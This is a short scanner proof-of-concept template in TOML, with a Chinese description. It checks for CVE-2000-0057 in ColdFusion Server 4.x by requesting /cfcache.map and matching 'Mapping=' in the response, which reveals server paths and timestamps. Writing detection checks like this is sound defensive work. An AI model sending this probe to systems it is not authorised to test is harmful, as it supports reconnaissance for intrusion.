[info]
author = "ave"
description = "检测 Allaire ColdFusion Server 4.x CFCACHE 标签将临时缓存文件存放于 Web 文档根目录的问题。通过请求 cfcache.map 文件，可读取服务器内部绝对路径、时间戳等敏感信息，确认漏洞存在。"
id = "POC-AVE-2000-0111"
name = "CVE-2000-0057 PoC - ColdFusion CFCACHE Information Disclosure"
severity = "high"
tags = ["ave-2000-0111"]
vuln_id = [
    "CVE-2000-0057",
    "AVE-2000-0111",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cfcache.map"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Mapping="]
